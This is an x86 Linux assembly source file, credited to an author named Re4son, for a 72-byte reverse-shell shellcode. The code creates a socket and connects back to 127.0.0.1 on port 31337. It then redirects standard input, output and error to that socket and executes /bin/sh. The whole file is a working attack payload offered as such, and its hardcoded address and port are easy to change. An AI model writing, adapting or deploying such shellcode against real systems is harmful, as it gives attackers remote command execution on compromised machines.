; Filename: reverseshell.nasm
; Author:   Re4son re4son [at] whitedome.com.au
; Website:  http://www.whitedome.com.au/re4son
;
; Purpose: Reverse shell connecting back to 127.0.0.1:31337
;          72 Bytes


global _start           

section .text

_start:

    ; --- socket ---
    cdq			;clear edx

    ; push socket(AF_INET=2, SOCK_STREAM=1, IPPROTO=0) parameters
    push edx		; 0 means protocol determined by server
    inc edx
    push edx
    mov ebx, edx	; store socket call sub function # 1 in bl	
    inc edx
    push edx
    
    mov ecx, esp    	; store pointer to arguments in ecx
  
    ; issue system call
    push 0x66
    pop eax		; get sys_socketcall system call number into al
    mov edi, eax    	; copy away for later re-use
    int 0x80        	; execute system call
    xchg edi, eax   	; socket fd in edi, sys_socketcall system call number back in al

    ; --- connect ---

    ; push connect() parameters
    push 0x0100007F     ; 127.0.0.1
    push word 0x697A	; port 31337
    push word 0x2   	; AF_INET

    mov ecx, esp    	; store pointer to the structure in ecx

    push 0x10         	; sizeof(struct sockaddr_in)
    push ecx        	; &serv_addr
    push edi        	; our socket descriptor

    mov ecx, esp    	; store pointer to arguments in ecx
    mov bl, 0x3	    	; sub call function number 3 for connect
    ; issue system call
    int 0x80        	; execute system call


    ; Move STDIN, STDOUT & STDERR to our new socket
    pop ebx		; sockfd is still on the stack
    xchg ecx, edx	; set loop counter to 2
    loop:
        mov al, 0x3f    ; store sys_dup2 system call number in al
        int 0x80	; execute system call
        dec ecx 
        jns loop

    ; execute /bin/sh
    ; execve("/bin/sh", NULL , NULL);
    cdq                 ; clear edx
    mov ecx, edx        ; clear ecx  
    push edx        	; push NULL termination
    push 0x68732f2f 	; //sh (we can add a slash to make it four non NULL bytes)
    push 0x6e69622f 	; /bin
    mov ebx, esp    	; store address of /bin/sh
    mov al, 0xb     	; store execve system call number in al  
    int 0x80        	; execute system call